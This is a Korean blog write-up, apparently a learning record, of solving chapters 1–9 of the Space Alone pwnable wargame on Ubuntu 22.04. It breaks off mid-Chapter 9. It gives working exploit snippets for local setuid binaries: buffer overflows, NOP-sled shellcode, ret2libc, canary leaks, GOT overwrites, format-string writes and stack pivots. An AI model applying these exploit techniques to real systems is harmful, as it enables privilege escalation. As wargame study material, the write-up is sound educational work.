---
layout: post
title: "Space Alone — LOB의 계승작을 2022년 우분투에서 끝까지 밀어봤다"
date: 2026-09-03 21:00:00 +0900
category: 시스템
author: WTCY
tags: [SpaceAlone, LOB, pwnable, BOF, ROP, FSB, GOT, StackPivot, ASLR, 카나리, 워게임, 시스템해킹, 학습기록]
excerpt: "hspace-io의 Space Alone은 해커스쿨 LOB를 Ubuntu 22.04로 옮긴 문제집입니다. VirtualBox가 없는 노트북에서 OVA를 QEMU로 띄우는 것부터 시작해 열 챕터를 순서대로 붙었습니다. 기법 자체는 교과서에 다 있는데, 옛 풀이가 지금은 안 되는 자리가 두 군데 나왔습니다. 실행 가능 스택인데 .bss가 실행이 안 됐고, dash가 setuid 프로세스의 real uid를 떨어뜨리는 게 아니라 올려놨습니다."
---

> **대상**: [hspace-io/Space_Alone](https://github.com/hspace-io/Space_Alone) — Chapter 1 ~ 10 및 에필로그
> **게스트**: Ubuntu 22.04.5 LTS · 커널 `5.15.173-hspace-knights-osori` · glibc 2.35-0ubuntu3.8 · `randomize_va_space=2`
> **호스트**: Windows 11 + WSL2 · QEMU 8.2.2 + KVM (VirtualBox 미설치)
> **결과**: 열 챕터 전부 셸 획득, `epilogue`(uid 511)까지 도달해 엔딩 재생

해커스쿨 **The Lord of BOF**를 처음 붙었을 때는 `gdb`로 스택 주소를 찍어서 그대로 박아 넣으면
됐습니다. Space Alone은 그 문제집을 2022년 우분투로 옮겨 놓은 물건입니다. 챕터를 깨면 다음 계정의
비밀번호가 나오고 그 계정 홈에 다음 setuid 바이너리가 놓여 있는 구조는 그대로인데, 밑바닥은
완전히 다릅니다. ASLR이 켜져 있고, 카나리가 있고, NX가 있고, 뒤로 갈수록 Full RELRO에 PIE까지
붙습니다.

먼저 결론부터 적습니다. **기법은 전부 교과서에 있는 것들이었고, 저를 막은 건 기법이 아니라
"옛날에는 맞았던 문장" 두 개였습니다.** 2장에서는 실행 가능 스택 바이너리인데도 `.bss`에서
셸코드가 안 돌았고, 3장에서는 `setreuid` 없이도 계정이 통째로 넘어왔습니다. 둘 다 제가 알고
있던 것과 반대였고, 확인하는 데 시간을 제일 많이 썼습니다.

아래는 이 글이 실제로 관측한 것만 추린 메타입니다. 문제 풀이 자체보다 이 표에 적힌 환경이
결론을 좌우한 대목이 많아서 앞에 둡니다.

| 항목 | 값 |
|---|---|
| 문제집 | Space Alone — LOB(mongii)의 정신적 계승작, 출제 Arkea·156·finder·Osori·yosimich·circler |
| 계정 사슬 | uid 500 `chall` → 501 … → 510 `The_Cure_Within_Reach` → 511 `epilogue` |
| 진행 방식 | 각 계정 홈의 setuid 바이너리를 터뜨려 셸 획득 → `status`가 다음 챕터 비밀번호 출력 |
| 기법 흐름 | 인접 변수 덮어쓰기 → 스택 셸코드 → ret2win → ret2libc → 카나리 유출 → 프레임 위조 → GOT 덮어쓰기 → 포맷 스트링 → 스택 피벗 → libc GOT 덮어쓰기 |
| 실행 가능 스택 | 10개 중 2개(2·3장)뿐, 그 둘만 32비트 |
| 관측한 스택 ASLR 폭 | i386 프로세스에서 스택 최상단 `0xff873000`~`0xfffe5000` (약 7.4MB, 10회 실행) |
| 확인한 uid 동작 | setuid 프로세스가 `/bin/sh`(dash)를 exec하면 `Uid: 504 504 504 504` — real uid가 euid로 올라감 |
| 확인 못 한 것 | 커널 소스는 못 봤습니다. `READ_IMPLIES_EXEC` 관련은 `personality`가 0이었다는 **관측**까지만 적습니다 |

---

## 환경 — VirtualBox 없이 OVA 띄우기

README는 VirtualBox에 `SpaceAlone.ova`를 가져오라고 합니다. 그런데 이 노트북에는 VirtualBox가
없었고(`.VirtualBox` 잔재만 남아 있었습니다) C 드라이브 여유가 35GB였습니다. OVA만 4.7GB입니다.
설치 프로그램을 하나 더 얹는 대신 QEMU로 돌리기로 했습니다.

OVA는 그냥 tar입니다. 풀면 하드웨어 명세(`.ovf`), 디스크(`.vmdk`), 해시(`.mf`)가 나옵니다.
받은 디스크가 온전한지부터 확인했습니다.

```console
$ tar xf SpaceAlone.ova
$ sha1sum "SpaceAlone 1-disk001.vmdk" ; grep vmdk SpaceAlone.mf
f778f3ced5260c9cf95c991674c79a58c3fa43fa  SpaceAlone 1-disk001.vmdk
SHA1 (SpaceAlone 1-disk001.vmdk) = f778f3ced5260c9cf95c991674c79a58c3fa43fa
```

VMDK는 `streamOptimized`(압축된 읽기 전용)라 qcow2로 통째로 변환하면 5GB를 또 씁니다. 대신
qcow2 오버레이를 얹으면 원본은 그대로 두고 변경분만 쌓입니다.

```console
$ qemu-img create -f qcow2 -F vmdk -b "SpaceAlone 1-disk001.vmdk" overlay.qcow2
$ qemu-img info overlay.qcow2 | head -4
virtual size: 50 GiB (53687091200 bytes)
disk size: 196 KiB
```

첫 부팅은 절반만 성공했습니다. 게스트는 로그인 프롬프트까지 올라오는데 6022 포트로 SSH가 붙지
않았습니다. `.ovf`를 보니 NIC이 VirtualBox NAT인데, VirtualBox는 이 NIC을 **PCI 슬롯 3번**에
붙입니다. 그래서 게스트 netplan은 인터페이스 이름을 `enp0s3`으로 알고 있습니다. QEMU에서
`-device e1000`을 그냥 주면 AHCI 컨트롤러가 슬롯 3을 먼저 가져가고 NIC이 4번으로 밀리면서
인터페이스 이름이 달라집니다. 슬롯을 못 박으니 바로 붙었습니다.

```console
$ qemu-system-x86_64 -M pc -enable-kvm -cpu host -smp 2 -m 4096 \
    -drive file=overlay.qcow2,format=qcow2,if=none,id=hd0 \
    -device ich9-ahci,id=ahci,addr=0xd -device ide-hd,drive=hd0,bus=ahci.0 \
    -netdev user,id=n0,hostfwd=tcp::6022-:22 \
    -device e1000,netdev=n0,addr=0x3 \
    -display none -vga std -monitor unix:/tmp/qemu-mon.sock,server,nowait
```

76초 뒤 `SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10`이 나왔습니다.

![QEMU 게스트 콘솔 화면. 'Ubuntu 22.04.5 LTS hsapce-io tty1' 아래에 'hsapce-io login:' 프롬프트가 떠 있다](/assets/img/space-alone/env-boot.png)

`chall` / `start`로 들어가면 `.bashrc`가 배너와 커스텀 명령어를 뿌립니다. `next`는 다음 계정으로
`su`하는 별칭이고, `status`가 현재 계정 기준으로 다음 챕터 비밀번호를 알려줍니다. 즉 목표는
플래그 문자열이 아니라 **셸 그 자체**입니다.

![게스트 콘솔에서 cmd 명령을 실행한 화면. Custom Command 아래에 next, story, chap, status 네 항목이 나열돼 있다](/assets/img/space-alone/custom-cmd.png)

이 글의 화면은 전부 이 게스트 콘솔(tty1)을 그대로 찍은 것입니다. 한글이 마름모로 보이는 건
리눅스 콘솔 폰트에 한글 글리프가 없어서입니다.

## 지형 — 계정 사슬과 완화 기법

계정은 uid 500번부터 511번까지 한 줄로 이어집니다. 각 홈에 다음 계정 소유의 setuid 바이너리가
하나씩 놓여 있습니다.

![게스트 콘솔의 계정 사슬 표. uid 500 chall(entry point), 501 The_Encrypted_Message(MV), 502 Decoding_for_Escape(File_Decoder), 503 Breaking_Through_for_Survival(stage3), 504 Scavening_for_Survival(stage4), 505 The_Alarm_of_Hope(ips), 506 Crisis_at_the_Vault(prob), 507 Wired_at_the_Vault(got), 508 Awakening_in_the_Dark(fsb), 509 On_the_Edge_of_Time(pivot), 510 The_Cure_Within_Reach(final), 511 epilogue 순으로 나열돼 있다](/assets/img/space-alone/home-chain.png)

열 개 바이너리의 완화 기법을 한 장에 모으면 문제집의 설계가 그대로 보입니다.

![게스트 콘솔에서 pwntools ELF로 뽑은 완화 기법 표. 01 MV amd64 Full RELRO 카나리없음 NX PIE, 02 File_Decoder i386 RELRO없음 NX없음 exec-stack yes, 03 stage3 i386 Partial NX없음 exec-stack yes, 04 stage4 amd64 Partial 카나리없음, 05 ips amd64 RELRO없음 카나리, 06 prob amd64 Partial 카나리, 07 got amd64 Partial 카나리, 08 fsb amd64 Partial 카나리, 09 pivot amd64 Full 카나리없음, 10 final amd64 Full 카나리 PIE 순으로 표시돼 있다](/assets/img/space-alone/mitigations.png)

실행 가능 스택은 2·3장 둘뿐이고 그 둘만 32비트입니다. 4장부터는 전부 64비트에 NX라 셸코드는
쓸 수 없습니다. 마지막 두 장은 Full RELRO라 바이너리 GOT도 못 건드립니다. **"옛날 기법으로
시작해서 요즘 보호를 하나씩 얹는" 순서**가 표에 그대로 드러납니다.

---

## Chapter 1 — 완화 기법이 아무 상관 없는 버그

첫 바이너리 `MV`는 Full RELRO에 PIE까지 걸려 있습니다. 그런데 버그는 제어 흐름을 뺏는 종류가
아닙니다.

```c
int cmp1 = 3, cmp2 = 3, cmp3 = 3, cmp4 = 3;
char admin[10] = "deny", id_input[20], pw_input[20];
scanf("%s", id_input);
scanf("%s", pw_input);
...
cmp3 = strncmp(id_input, "admin", 5);
cmp4 = strncmp(admin, "confirm", 7);
if (cmp3 == 0 && cmp4 == 0) { root(); }        // .TOP_SECRET 를 읽어 준다
```

`admin[]`은 스택에 놓인 지역 변수이고 초기값이 `"deny"`입니다. 이걸 `"confirm"`으로 바꾸면
관리자 메뉴가 열립니다. 위치는 디스어셈블에 그대로 적혀 있습니다.

```
195f: lea rax,[rbp-0x30]                        ; id_input
197e: lea rax,[rbp-0x50]                        ; pw_input
191e: mov QWORD PTR [rbp-0x1a], 0x796e6564      ; admin[] = "deny"
```

`id_input`(rbp-0x30)에서 `admin`(rbp-0x1a)까지 22바이트입니다. 앞 5바이트가 `"admin"`이어야
`cmp3`가 0이 되니, 남는 17바이트를 채우고 `"confirm"`을 얹으면 두 조건이 동시에 맞습니다.

```python
OFF = 0x30 - 0x1a                       # 22
p.sendline(b'admin'.ljust(OFF, b'A') + b'confirm')
p.sendline(b'x')
```

`if (strncmp(id_input,"admin",5)==0) printf("%s\n", admin);` 한 줄이 덤으로 붙어 있어서,
덮어쓰기가 먹혔는지 화면에 `confirm`이 찍히는 걸로 바로 확인됩니다. PIE도 RELRO도 이 버그
앞에서는 할 일이 없습니다. **첫 문제가 "보호가 다 켜져 있어도 논리가 무너지면 소용없다"를
보여 주고 시작하는 게 이 문제집의 성격입니다.**

![게스트 콘솔에서 ch1 익스플로잇을 실행한 화면. su The_Encrypted_Message로 ex1.py를 돌려 'Redirect to Admin page'가 뜨고 ADMIN 아스키 배너 아래 관리자 메뉴가 나온 뒤 .TOP_SECRET 내용인 'Password for chapter2 / # simple_bof'가 출력돼 있다](/assets/img/space-alone/ch01.png)

## Chapter 2 — 실행 가능 스택인데 .bss는 실행이 안 됐다

`File_Decoder`는 32비트에 `GNU_STACK`이 RWE입니다. 소스에 시리얼 번호가 그대로 박혀 있어서
그걸 입력하면 `.Real_Top_Secret`을 XOR 복호해 보여 주는데, 열어 보면 스토리 텍스트뿐이고
비밀번호는 없습니다. `gets(serial)`로 셸을 따는 게 진짜 길입니다.

```c
char serial[256] = {0, };
printf("Serial Number: ");
gets(serial);              // 길이 제한이 없다
```

`serial`은 `ebp-0x108`, 저장된 EIP는 268바이트 뒤입니다. 처음에는 편한 길로 갔습니다. NX가
없으니 `gets@plt`로 `.bss`에 셸코드를 한 번 더 읽어 들이고 거기로 뛰면 ASLR과 무관하게 끝날
거라고 봤습니다. `0x0804xxxx`는 고정이니까요.

```python
p.sendline(b'A'*272 + p32(GETS_PLT) + p32(BSS) + p32(BSS))
p.sendline(shellcode)
```

SIGSEGV였습니다. 이유를 보려고 setuid가 안 걸린 사본을 `/tmp`에 두고 매핑을 확인했습니다.

![게스트 콘솔 화면. randomize_va_space가 2, /proc/PID/maps에서 File_Decoder 세그먼트들과 [stack]이 rwxp로 표시되고, /proc/PID/personality는 00000000, 10회 실행한 스택 최상단이 0xff873000에서 0xfffe5000까지 약 7.4MB 범위로 흩어져 있다](/assets/img/space-alone/ch02-facts.png)

`[stack]`은 확실히 `rwxp`입니다. 그런데 `personality`가 **0**입니다. `READ_IMPLIES_EXEC`이
안 붙었다는 뜻이고, 그러면 읽기 가능한 매핑이 실행 가능해지지 않으니 `.bss`는 여전히 NX입니다.

여기서 정확히 해둘 게 있습니다. 제가 확인한 것은 **이 커널에서 이 바이너리의 personality가
0이었고 `.bss`에서 실행이 안 됐다**는 관측까지입니다. "PT_GNU_STACK이 RWE로 존재하는 경우와
아예 없는 경우를 커널이 다르게 판정한다"는 설명이 널리 알려져 있지만, 저는 커널 소스를 직접
확인하지 않았으므로 그 인과를 단언하지 않겠습니다. 확실한 건 하나입니다 — **"실행 가능
스택이면 데이터 영역도 실행된다"는 옛 문장은 여기서 성립하지 않았습니다.**

그러면 실행 가능 영역은 스택뿐이고, 스택은 ASLR 대상입니다. 같은 화면에서 열 번 재실행한
스택 최상단이 약 7.4MB 안에서 흩어졌습니다. 정확히 맞히는 대신 **과녁을 키우는** 쪽을 택했습니다.
setuid는 환경 변수를 지우지 않으니 NOP 슬레드를 환경 변수로 밀어 넣으면 됩니다. 문자열 하나당
128KB(`MAX_ARG_STRLEN`) 제한이 있어서 130000바이트짜리 12개로 약 1.5MB를 채우고, 리턴 주소는
`0xffa00000` 한 곳으로 고정했습니다.

```python
sled = {'S%02d' % i: b'\x90' * (CHUNK - len(sc)) + sc for i in range(12)}
p = process(BIN, env=sled)
p.sendline(b'A' * (0x108 + 4) + p32(0xffa00000))
```

1.5MB / 7.4MB면 한 번에 맞을 확률이 대략 5분의 1입니다. 처음 돌렸을 때는 1회에 들어갔고, 화면을
찍으려고 다시 돌렸을 때는 14회 만에 들어갔습니다. 확률이 그대로 보이는 화면이 더 정직해서
그대로 씁니다.

![게스트 콘솔에서 ch2 익스플로잇을 실행한 화면. 'landed on attempt 14' 뒤에 uid=503(Breaking_Through_for_Survival)이 찍히고 status가 Chapter3 PW: Escape_Triggered_by_shellcode를 출력한다](/assets/img/space-alone/ch02.png)

셸코드 앞에는 `geteuid32` → `setresuid32(euid,euid,euid)`를 붙였습니다. 그런데 다음 장에서
그게 필요 없었다는 걸 알게 됩니다.

## Chapter 3 — dash가 uid를 대신 올려 준다

`stage3`는 이 문제집에서 제일 짧습니다. `Open_Door()`의 `password[20]`이 `ebp-0x18`이고
`scanf("%s")`에 길이 제한이 없습니다. `system("/bin/sh")`를 부르는 `shell()`이 그대로 들어
있고 PIE가 없으니, 리턴 주소를 `0x080491a6`으로 바꾸는 게 전부입니다.

```python
p.sendline(b'5')                                # [5] Open Door
p.sendline(b'A'*(0x18+4) + p32(0x080491a6))
```

여기서 확인하고 싶은 게 있었습니다. `stage3`는 `Scavening_for_Survival`(504) 소유 setuid이고
실행하는 쪽은 `Breaking_Through_for_Survival`(503)입니다. 보통 이러면 프로세스 안에서 real uid는
503, effective uid는 504입니다. bash라면 `-p` 없이 실행될 때 권한을 real uid로 **떨어뜨리기**
때문에, 옛 LOB 풀이들이 셸코드에 `setreuid`를 꼭 넣었습니다. 그래서 셸 안에서 uid 네 개를 전부
찍어 봤습니다.

![게스트 콘솔 화면. /bin/sh가 dash 심볼릭 링크이고 stage3이 Scavening_for_Survival 소유 setuid임을 보여 준 뒤, 실행자 id가 503인데 shell()이 띄운 셸 안에서 /proc/self/status의 Uid가 504 504 504 504, Gid가 503 503 503 503으로 나온다](/assets/img/space-alone/ch03-uid.png)

`Uid: 504 504 504 504`. real·effective·saved·fs uid가 전부 소유자로 통일됐습니다. 떨어뜨리는
게 아니라 **올려 놓습니다.** 우분투의 `/bin/sh`는 dash이고, dash는 이 상황에서 real uid를
euid에 맞춥니다.

이게 이 워게임이 굴러가는 핵심입니다. 셸 하나만 따면 그 계정을 온전히 갖게 되고, 그래서
`status`가 다음 챕터 비밀번호를 그냥 내줍니다. 마지막 에필로그의 `get_vaccine`이 `geteuid()`가
아니라 `getuid()`를 검사하는데도 통과하는 이유이기도 합니다. 2장에 넣었던 `setresuid`는
결과적으로 없어도 됐지만, 해로울 게 없어서 그대로 뒀습니다.

![게스트 콘솔에서 ch3 ret2win을 실행한 화면. Armory Management System 메뉴 아래 'You Open the Armory Door!'가 찍히고 uid=504(Scavening_for_Survival), Chapter4 PW: extRAOrdinary_crawbar! 가 출력돼 있다](/assets/img/space-alone/ch03.png)

## Chapter 4 — 문제가 직접 건네주는 libc 주소

4장부터 64비트에 NX입니다. `stage4`는 메뉴 2번에서 이런 줄을 찍습니다.

```c
printf("Address of freezer warehouse : %p\n", &read);
read(0, buf, 0x400);            // buf 는 char[0x40]
```

`&read`는 GOT에 들어 있는 **런타임 libc 주소**입니다. 리크를 문제가 대신 해 주는 셈입니다.
게다가 저자가 `gadget()`이라는 함수를 일부러 넣어 뒀습니다.

```c
void gadget() {
    asm("pop %rdi; ret");
    asm("pop %rsi; pop %r15; ret");
    asm("pop %rdx; ret");
}
```

`char MasterKey[16] = "/bin/sh";`도 전역으로 박혀 있고 PIE가 없으니 주소가 `0x404050`으로
고정입니다. 재료가 다 갖춰져 있어서 ret2libc가 한 줄로 끝납니다.

```python
base   = leak - libc.symbols['read']
system = base + libc.symbols['system']
p.send(b'A'*(0x50+8) + p64(RET) + p64(POP_RDI) + p64(0x404050) + p64(system))
```

`RET` 하나를 앞에 끼운 건 정렬 때문입니다. `system()` 내부의 `movaps`는 16바이트 정렬을
요구하고, 그러려면 함수 진입 시점의 `rsp % 16`이 8이어야 합니다. 이 한 칸은 뒤에서 한 번 더
발목을 잡습니다.

![게스트 콘솔에서 ch4 ret2libc를 실행한 화면. read@libc, libc base, system 주소가 차례로 찍히고 uid=505(The_Alarm_of_Hope), Chapter5 PW: i_gROPed_for_food_in_the_dark 가 출력돼 있다](/assets/img/space-alone/ch04.png)

## Chapter 5 — 카나리는 유출하고, 프레임은 위조한다

`ips`가 이 문제집에서 제일 오래 붙은 문제입니다. 버그는 `sizeof` 하나입니다.

```c
struct auth { char username[50]; char passwd[50]; };   // 100 바이트
char username[50];  char passwd[50];
read(0, username, sizeof(struct auth));   // 50 짜리 버퍼에 100
read(0, passwd,   sizeof(struct auth));   // 여기도 100
```

`username`은 `rbp-0x80`, `passwd`는 `rbp-0x40`, 카나리는 `rbp-0x8`입니다. `passwd` 쪽 읽기가
`rbp+0x24`까지 닿으니 카나리·저장된 rbp·저장된 rip가 전부 사정권입니다. 문제는 카나리입니다.

리크 통로는 `printf("\nYour account: %s\n", username)` 하나뿐입니다. `%s`는 첫 0바이트에서
멈추는데 카나리의 최하위 바이트는 항상 `0x00`이라, 가만히 두면 절대 카나리를 넘지 못합니다.
그래서 **그 한 바이트만** 덮습니다. `passwd`에 정확히 57바이트를 보내면 57번째 바이트가 카나리
LSB 자리에 떨어지고 나머지 7바이트는 그대로 남습니다.

```python
p.send(b'A'*99 + b'\n')     # username: strcspn 의 NUL 을 rbp-0x1d 로 밀어 둔다
p.send(b'B'*56 + b'C')      # passwd  : 57번째 'C' 가 카나리 LSB 를 밀어낸다
leak = p.recvuntil(b'\n', drop=True)      # 134 바이트
canary  = b'\x00' + leak[121:128]
```

이 인덱스를 121이 아니라 120으로 잡아서 여섯 번을 연달아 실패했습니다. `username`에서 `passwd`까지가
`0x40` = **64**바이트인데 63으로 세었던 겁니다. 리크한 카나리가 매번 `0x....4300`으로 끝나는 걸
보고서야 알아챘습니다. `0x43`은 제가 넣은 `'C'`니까 한 칸이 밀린 거였습니다. **리크 값에 내가
보낸 바이트가 섞여 나오는 건 오프셋을 검산하기에 아주 좋은 표지입니다.**

카나리를 알았으니 ROP를 짤 차례인데 여기서 막혔습니다. 이 바이너리에는 `pop rdi`가 **없습니다.**
ROPgadget이 찾아 준 건 `leave ; ret`과 `ret`이 전부입니다. 그런데 이상하게도 `system@plt`가
재배치 테이블에 있고 `/bin/sh` 문자열도 `.rodata`에 박혀 있습니다. 소스에는 `system()`을 부르는
곳이 한 군데도 없는데도요. 저자가 일부러 놓아둔 재료입니다.

그래서 체인을 짜는 대신 **프레임을 위조했습니다.** `IPS`의 에필로그는 `leave ; ret`이고
`leave`가 `pop rbp`를 하니, 저장된 rbp를 우리가 정하면 그다음 코드가 쓰는 `rbp` 상대 주소를
전부 우리가 정하는 셈입니다. 인증 루프 맨 위(`0x401881`)로 되돌리면서 `rbp = 0x403d08`을 주면
이렇게 됩니다.

| 코드가 쓰는 이름 | 원래 자리 | 위조 후 실제 주소 |
|---|---|---|
| `username` (`rbp-0x80`) | 스택 | `0x403c88` = `strncmp@got` |
| `passwd` (`rbp-0x40`) | 스택 | `0x403cc8` = `strcmp@got` |

이제 루프가 알아서 일해 줍니다. 첫 번째 `read`가 `strncmp@got`에 `system@plt`를 쓰고, 두 번째
`read`가 `"/bin/sh"`를 `passwd` 자리에 씁니다. 그리고 루프 끝에서 코드가 스스로
`strncmp(passwd, auth->passwd, 8)`을 부르는데, **그게 곧 `system("/bin/sh")`입니다.**

```python
p.send(b'D'*56 + canary + p64(0x403d08) + p64(0x401881))   # 3번째 시도에 심는다
...
p.send(p64(0x401150))       # read #1 -> strncmp@got = system@plt
p.send(b'/bin/sh\x00')      # read #2 -> rdi 가 될 자리
```

참을 게 하나 있습니다. 위조한 리턴 주소는 `IPS`가 **리턴할 때** 발동하는데, `IPS`는 인증을 세 번
틀려야 리턴하고, 세 번 틀리면 30초를 세고 나서야 나갑니다. 그 30초는 그냥 기다려야 합니다.

![게스트 콘솔에서 ch5 익스플로잇을 실행한 화면. leak len 134, canary, saved rbp가 찍히고 '3 tries burned, waiting out the 30 s lockout', 're-entered the loop on a forged frame'을 지나 uid=506(Crisis_at_the_Vault), Chapter6 PW: i_wA5_A_bos5... 가 출력돼 있다](/assets/img/space-alone/ch05.png)

## Chapter 6 — 유출을 두 번에 나눈다

`prob`는 일기장입니다. 페이지 여섯 개의 주소가 `diary[]`에 들어 있고 쓰기 메뉴가
`read(0, diary[index], 0x100)`을 합니다. 페이지는 전부 `main`의 스택 지역 변수인데 `0x100`은
어느 페이지보다도 큽니다.

```
diary[0]=rbp-0x1c0  diary[1]=rbp-0x290  diary[2]=rbp-0x130
diary[3]=rbp-0x230  diary[4]=rbp-0xa0   diary[5]=rbp-0x2d0
```

가장 위에 있는 건 `diary[4]`입니다. 여기에 `0x100`을 쓰면 카나리(오프셋 0x98), 저장된
rbp(0xa0), 저장된 rip(0xa8)가 전부 덮입니다. 읽기 메뉴가 `puts(diary[index])`라 유출 통로도
같은 버퍼입니다.

`puts`도 0바이트에서 멈추니 5장과 같은 문제가 생기는데, 여기서는 두 번에 나눠 풀었습니다.

1. 152바이트 채우고 한 바이트 더 → 카나리 LSB만 죽인다 → `puts`가 카나리 1~7바이트를 흘린다.
2. 그 카나리를 **제자리에 복원**하고 저장된 rbp 8바이트를 0이 아닌 값으로 채운다 → 이번엔
   `puts`가 저장된 rip까지 흘린다. 그게 libc 주소다.

```python
write_page(p, 4, b'A'*152 + b'B')                       # 1단계
canary = b'\x00' + read_page(p, 4)[153:160]
write_page(p, 4, b'A'*152 + b'B' + canary[1:] + b'C'*8) # 2단계
saved_rip = u64(read_page(p, 4)[168:174].ljust(8, b'\x00'))
```

저장된 rip가 libc의 어느 오프셋인지는 재야 압니다. 같은 바이너리를 `/tmp`에 복사해 두고
(사본은 setuid가 아니라 `/proc/pid/maps`를 읽을 수 있습니다) 같은 유출을 한 번 돌려서
`libc + 0x29d90`을 재고 시작했습니다. README가 "디버깅하려면 복사해서 쓰라"고 안내한 게 이
용도입니다.

가끔 실패합니다. 카나리 7바이트 안에 `0x0a`가 섞이면 `puts`가 거기서 줄을 끊어 길이가
모자랍니다. 256분의 7쯤 되는 확률이라 다시 돌리면 됩니다. 실제로 한 번 걸렸습니다.

![게스트 콘솔에서 ch6 익스플로잇을 실행한 화면. calibration으로 saved rip = libc + 0x29d90을 구하고 canary와 libc base를 찍은 뒤 uid=507(Wired_at_the_Vault), Chapter7 PW: anchovy 가 출력돼 있다](/assets/img/space-alone/ch06.png)

## Chapter 7 — 카나리를 못 읽으면 심판을 바꾼다

`got`는 배열 인덱스를 검사하지 않습니다.

```c
unsigned long long wire[100];          // 0x404080
scanf("%d", &select);                  // 음수도 받는다
scanf("%llu", &wire[select]);          // 임의 주소에 8바이트
```

`wire`가 `0x404080`이고 GOT가 `0x404018`부터니 인덱스 -13이 `puts@got`, -12가
`__stack_chk_fail@got`입니다. Partial RELRO라 GOT는 쓰기 가능합니다.

한편 `startup()`에는 `read(0, wish, 0x200)`이 `char wish[0x100]`에 들어 있어 리턴 주소까지
닿는데, 카나리가 있고 이 프로그램은 버퍼 내용을 **한 번도 출력하지 않습니다.** 유출 통로가
없으니 카나리를 알 방법이 없습니다.

그래서 카나리를 맞히는 대신 심판을 바꿨습니다. `__stack_chk_fail@got`에 `startup()` 자신의
에필로그 주소(`0x401263`, `leave ; ret`)를 써 두면, 카나리가 틀렸을 때 실행되는
`call __stack_chk_fail`이 그대로 우리 체인으로 들어옵니다. **카나리 검사는 통과하는 게 아니라
무의미해집니다.**

```python
oob_write(p, 0x404020, 0x401263)        # __stack_chk_fail@got := startup 의 leave;ret
p.send(b'A'*(0x110+8) + flat(RET, POP_RDI, GOT_PUTS, PUTS_PLT, STARTUP))
```

한 번에 셸까지는 못 갑니다. libc를 모르니 1회차는 `puts(puts@got)`로 주소만 받고 체인 끝에서
`startup`으로 되돌립니다. 2회차에 진짜 ret2libc를 넣습니다.

그 2회차에서 한 번 죽었습니다. 1회차와 똑같이 `ret` 정렬 가젯을 앞에 붙였는데, 1회차 체인이
`startup`을 다시 부르면서 `rbp`의 정렬 위상이 8만큼 밀려 있었습니다. 그 상태에서 `ret`을 하나 더
끼우니 `system` 진입 시 `rsp % 16`이 0이 되어 `movaps`에서 죽었습니다. 빼니까 붙었습니다.
**정렬 가젯은 "일단 넣고 보는" 물건이 아니라 매번 세어 봐야 하는 물건입니다.**

![게스트 콘솔에서 ch7 익스플로잇을 실행한 화면. '__stack_chk_fail@got := 0x401263 (startup's leave;ret)'와 puts@libc, libc base가 찍히고 uid=508(Awakening_in_the_Dark), Chapter8 PW: goat_got_got 이 출력돼 있다](/assets/img/space-alone/ch07.png)

## Chapter 8 — printf 하나로 리크와 쓰기를 모두

`fsb`는 이름 그대로입니다.

```c
read(0, buf, 0x9f);
printf(buf);            // 포맷 스트링
```

`buf`는 `rbp-0x110`이고, 계산하면 `printf`의 **8번째 가변 인자**가 `buf`의 첫 8바이트입니다.
`%42$p`가 저장된 rbp, `%43$p`가 저장된 rip 즉 libc입니다(6장과 같은 자리라 오프셋도 같은
`0x29d90`이었습니다).

여기서 사소하지만 시간을 꽤 먹은 실수를 했습니다. 리크 값을 뽑으려고
`re.search(rb'0x[0-9a-f]+', out)`을 썼는데, 출력이 `0x7f306e9d7d90` 바로 뒤에 메뉴
`1. search medicine`이 붙어 나옵니다. `1`도 16진수 문자라 정규식이 그것까지 먹어서
`0x7f306e9d7d901`이 됐습니다. **리크 파싱은 항상 뒤쪽 경계를 명시적으로 잘라야 합니다.**

쓰기 쪽은 GOT입니다. Partial RELRO라 `printf@got`에 `system`을 쓰면 **바로 다음 루프의**
`printf(buf)`가 `system(buf)`가 됩니다. `buf`는 우리가 채우니 `"/bin/sh"`만 보내면 끝입니다.

```python
menu1(p, fmtstr_payload(8, {0x404028: system}, write_size='short'))
p.sendline(b'1')
p.send(b'/bin/sh\x00'.ljust(0x9f, b'\x00'))
```

덤으로 `open_emergency_medicine()`이 `flag` 파일을 읽어 출력하게 돼 있어서, `scanf@got`를 이
함수로 바꾸는 것만으로도 파일 내용을 볼 수 있습니다. 그런데 여기 함정이 있습니다. 소스는
`printf("%s\n", buf)`인데 gcc가 이걸 `puts(buf)`로 바꿔 놨습니다. 그래서 `puts@got`를 덮으면
무한 재귀에 빠집니다. **소스가 아니라 디스어셈블을 보고 대상을 골라야 하는 자리입니다.**

![게스트 콘솔에서 ch8 익스플로잇을 실행한 화면. calibration으로 saved rip = libc + 0x29d90, flag file = '> fsbeeee', libc base를 찍은 뒤 uid=509(On_the_Edge_of_Time)와 flag 내용 fsbeeee, Chapter9 PW: fsbeeee 가 출력돼 있다](/assets/img/space-alone/ch08.png)

`flag` 파일 내용이 그대로 9장 비밀번호였습니다.

## Chapter 9 — 피벗한 스택은 4KB뿐이다

`pivot`은 기회가 한 번뿐입니다.

```c
int loop = 0;
...
if (loop) { puts("Goobye, Sir"); exit(-1); }
loop = 1;
read(0, buf, 0x70);          // buf 는 char[0x30]
return 0;
```

`buf`가 `rbp-0x30`이니 리턴 주소까지 56바이트, 남는 건 56바이트 = **7칸**입니다. `loop` 때문에
`main`으로 되돌아가 봐야 `exit`뿐이라 이어 붙일 수도 없습니다. 리크 + ret2libc를 7칸에 담는 건
무리라, 7번째 칸을 `leave ; ret`으로 쓰고 저장된 rbp를 `.bss`로 겨눴습니다. 스택 자체를 옮기는
겁니다.

```python
p.send(b'A'*0x30 + p64(PIVOT-8) +
       flat(POP_RSI_R15, PIVOT, 0, POP_RDX, 0x100, READ_PLT, LEAVE_RET))
```

`read(0, 0x404200, 0x100)`이 다음 체인을 `.bss`에 실어 오고 `leave ; ret`이 `rsp`를 거기로
옮깁니다. 2단은 자리가 넉넉하니 `puts(puts@got)`로 libc를 흘리고, 그 뒤에 `read`를 한 번 더
불러서 **자기 체인 바로 뒤에** 마지막 단을 받아 그대로 흘러 들어가게 했습니다.

마지막 단을 `system("/bin/sh")`로 짰다가 죽었습니다. 이유가 재미있습니다. `.bss`로 피벗하면
그 순간부터 "스택"은 그 RW 페이지 **하나(4KB)**입니다. `rsp`가 `0x404278`쯤에 있으니 아래로
쓸 수 있는 게 600바이트 남짓인데, glibc의 `system()`은 `posix_spawn`을 거치며 그보다 훨씬 많이
씁니다. **피벗 대상은 "쓰기 가능한 곳"이면 되는 게 아니라 "호출할 함수가 쓸 스택까지 들어가는
곳"이어야 합니다.**

그래서 마지막 단을 raw `execve` 시스템 콜로 바꿨습니다. 시스템 콜은 호출자 스택을 쓰지 않습니다.

```python
